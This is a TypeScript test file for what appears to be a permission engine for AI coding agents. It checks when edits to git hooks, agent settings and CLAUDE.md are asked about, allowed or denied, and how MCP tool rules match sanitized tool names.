    expect(planModeOutranksRules('command', { command: 'Get-Content README.md' }, scope)).toBe(
      false
    )
    expect(planModeOutranksRules('command', { command: 'Set-Content x y' }, scope)).toBe(true)
    expect(planModeOutranksRules('command', { command: 'Get-Content README.md' })).toBe(true)
  })
})

// ADR-084 §3 — the acceptEdits base (also auto mode's base) asks for edits to
// agent-control paths instead of auto-allowing them.
describe('decide — acceptEdits base asks for agent-control paths (ADR-084)', () => {
  const ctx = (cwd: string | undefined = '/repo', mode = 'acceptEdits') => ({
    mode,
    rules: rules(),
    sessionAllows: NO_SESSION_ALLOWS,
    ...(cwd === undefined ? {} : { cwd })
  })

  it.each([
    ['edit', '.git/config'],
    ['write', '/repo/.git/hooks/pre-commit'],
    ['edit', 'sub/.git/hooks/pre-commit'],
    ['edit', '.claude/settings.json'],
    ['write', '.vscode/tasks.json'],
    ['edit', 'CLAUDE.md'],
    ['write', '.pi/settings.json'],
    ['edit', '.GIT/config']
  ])('%s %s -> ask (mode-base)', (tool, p) => {
    expect(decideWithSource(tool, { path: p }, ctx())).toEqual({
      decision: 'ask',
      source: 'mode-base'
    })
  })

  it('reads the legacy file_path alias too', () => {
    expect(decide('edit', { file_path: '.git/config' }, ctx())).toBe('ask')
  })

  it('an ordinary edit is still auto-allowed', () => {
    expect(decide('edit', { path: 'src/a.ts' }, ctx())).toBe('allow')
    expect(decide('write', { path: '/repo/src/.git-hooks-docs.md' }, ctx())).toBe('allow')
  })

  it('Windows cwd and separators', () => {
    const win = ctx('D:\\repo')
    expect(decide('edit', { path: 'D:\\repo\\.git\\config' }, win)).toBe('ask')
    expect(decide('edit', { path: 'sub\\.claude\\settings.json' }, win)).toBe('ask')
    expect(decide('edit', { path: 'D:\\repo\\src\\a.ts' }, win)).toBe('allow')
  })

  it('a session inside a worktree under .claude/ does not ask for every edit', () => {
    const wt = ctx('/repo/.claude/worktrees/feat')
    expect(decide('edit', { path: '/repo/.claude/worktrees/feat/src/a.ts' }, wt)).toBe('allow')
    expect(decide('edit', { path: 'src/a.ts' }, wt)).toBe('allow')
    // …but a path that climbs out to the repo's own .claude/ is matched absolutely.
    expect(decide('edit', { path: '../../settings.json' }, wt)).toBe('ask')
    expect(decide('edit', { path: '/repo/.claude/settings.json' }, wt)).toBe('ask')
  })

  it('a user ALLOW rule still wins outside auto mode; a user deny still denies', () => {
    const allow = { ...ctx(), rules: rules({ allow: ['Edit(.claude/**)'] }) }
    expect(decide('edit', { path: '.claude/settings.json' }, allow)).toBe('allow')
    const deny = { ...ctx(), rules: rules({ deny: ['Edit(.git/**)'] }) }
    expect(decide('edit', { path: '.git/config' }, deny)).toBe('deny')
  })

  it('other modes are unchanged: default asks every edit, full allows, plan denies', () => {
    expect(decide('edit', { path: 'src/a.ts' }, ctx('/repo', 'default'))).toBe('ask')
    expect(decide('edit', { path: '.git/config' }, ctx('/repo', 'full'))).toBe('allow')
    expect(decide('edit', { path: '.git/config' }, ctx('/repo', 'plan'))).toBe('deny')
  })
})

/**
 * ADR-096. pi names an MCP tool `mcp__<server>__<tool>` passed through its
 * sanitizer (everything but `[A-Za-z0-9_]` → `_`), so `my-server`'s `get-issue`
 * is called `mcp__my_server__get_issue`. A rule the user wrote for Claude
 * (`mcp__my-server__get-issue`, `mcp__my-server`) must bind to that call; pi's
 * gates pass `mcpRuleKey: piMcpRuleKey` for it. Without the key (Codex, which
 * names MCP calls in Claude's own form) rules compare as written.
 */
describe('decide — MCP rules against pi-sanitized tool names (ADR-096)', () => {
  const ctx = (partial: Partial<MergedClaudeRules>, keyed = true) => ({
    mode: 'default',
    rules: rules(partial),
    sessionAllows: NO_SESSION_ALLOWS,
    cwd: '/repo',
    ...(keyed ? { mcpRuleKey: piMcpRuleKey } : {})
  })
  const TOOL = 'mcp__my_server__get_issue'

  it('a Claude-form tool rule binds in every tier', () => {
    expect(decideWithSource(TOOL, {}, ctx({ allow: ['mcp__my-server__get-issue'] }))).toEqual({
      decision: 'allow',
      source: 'allow-rule',
      rule: 'mcp__my-server__get-issue'
    })
    expect(decide(TOOL, {}, ctx({ deny: ['mcp__my-server__get-issue'] }))).toBe('deny')
    expect(
      decide(TOOL, {}, ctx({ ask: ['mcp__my-server__get-issue'], allow: ['mcp__my-server'] }))
    ).toBe('ask')
  })

  it('the server forms (`mcp__s`, `mcp__s__*`) cover every tool of that server only', () => {
    expect(decide(TOOL, {}, ctx({ allow: ['mcp__my-server'] }))).toBe('allow')
    expect(decide(TOOL, {}, ctx({ deny: ['mcp__my-server__*'] }))).toBe('deny')
    expect(decide('mcp__my_server_two__x', {}, ctx({ allow: ['mcp__my-server'] }))).toBe('ask')
  })

  it('a rule for another tool does not match', () => {
    expect(decide(TOOL, {}, ctx({ allow: ['mcp__my-server__close-issue'] }))).toBe('ask')
  })

  it('without the key the hyphenated rule stays inert (the gap this closes)', () => {
    expect(decide(TOOL, {}, ctx({ allow: ['mcp__my-server__get-issue'] }, false))).toBe('ask')
  })
})
